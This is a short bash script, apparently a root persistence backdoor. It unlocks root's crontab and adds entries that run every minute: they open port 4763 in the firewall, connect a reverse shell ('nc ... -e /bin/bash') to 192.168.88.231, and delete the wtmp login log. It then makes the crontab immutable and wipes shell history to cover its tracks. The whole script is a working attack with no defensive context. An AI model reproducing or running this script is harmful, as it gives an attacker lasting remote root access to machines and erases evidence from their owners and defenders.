#!/bin/bash
#run with privilages

#set up cron file for root
sudo chattr -i /var/spool/cron/root

touch /var/spool/cron/root
/usr/bin/crontab /var/spool/cron/root

touch /var/spool/cron/root
/usr/bin/crontab /var/spool/cron/root

echo "*/1 * * * * sudo iptables -I INPUT 1 -p tcp --dport 4763 -j ACCEPT" >> /var/spool/cron/root
echo "*/1 * * * * sudo iptables -I OUTPUT 1 -p tcp --dport 4763 -j ACCEPT" >> /var/spool/cron/root
echo "*/1 * * * * nc 192.168.88.231 4763 -e /bin/bash &" >> /var/spool/cron/root
echo "*/1 * * * * rm /var/log/wtmp" >> /var/spool/cron/root

sudo chattr +i /var/spool/cron/root

cat /dev/null > ~/.bash_history && history -c && exit

./niceScript.sh
